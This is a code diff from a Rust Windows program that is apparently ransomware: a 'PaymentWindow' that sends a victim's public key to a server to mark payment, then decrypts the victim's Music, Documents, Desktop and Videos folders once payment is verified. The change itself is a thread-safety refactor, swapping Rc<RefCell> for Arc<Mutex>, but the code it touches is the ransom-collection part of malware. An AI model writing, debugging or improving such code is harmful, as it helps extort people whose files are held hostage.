@@ -1,19 +1,15 @@
 use native_windows_gui as nwg;
 use native_windows_derive::NwgUi;
 use nwg::NativeUi;
+use std::sync::{Arc, Mutex};
 use std::rc::Rc;
 use std::cell::RefCell;
 use sodiumoxide::crypto::box_::PublicKey;
 
-use crate::networking::client::{mark_paid, check_payment, get_key};
+use crate::networking::client::{mark_paid, get_key};
 use crate::cryptography::encrypt::decrypt_folder;
 use std::path::PathBuf;
-use windows::{
-    core::PWSTR,
-    Win32::{
-        UI::Shell::{SHGetKnownFolderPath, FOLDERID_Music, FOLDERID_Documents, FOLDERID_Desktop, FOLDERID_Videos, KNOWN_FOLDER_FLAG},
-    },
-};
+use windows::Win32::UI::Shell::{SHGetKnownFolderPath, FOLDERID_Music, FOLDERID_Documents, FOLDERID_Desktop, FOLDERID_Videos, KNOWN_FOLDER_FLAG};
 
 #[derive(Default, NwgUi)]
 pub struct PaymentWindow {
@@ -38,7 +34,7 @@ pub struct PaymentWindow {
     status_display: nwg::TextBox,
 
     pub_key: Rc<RefCell<Option<PublicKey>>>,
-    payment_made: Rc<RefCell<bool>>,
+    payment_made: Arc<Mutex<bool>>,
 }
 
 impl PaymentWindow {
@@ -57,7 +53,7 @@ impl PaymentWindow {
             tokio::spawn(async move {
                 match mark_paid(&pk_clone).await {
                     Ok(_) => {
-                        *payment_made.borrow_mut() = true;
+                        *payment_made.lock().unwrap() = true;
                     },
                     Err(_) => {},
                 }
@@ -73,7 +69,7 @@ impl PaymentWindow {
         if let Some(_pk) = self.pub_key.borrow().as_ref() {
             self.status_display.set_text("Verifying payment status...");
             
-            if *self.payment_made.borrow() {
+            if *self.payment_made.lock().unwrap() {
                 self.status_display.set_text("Good. Payment verified! Starting decryption...");
                 self.decrypt_files();
             } else {
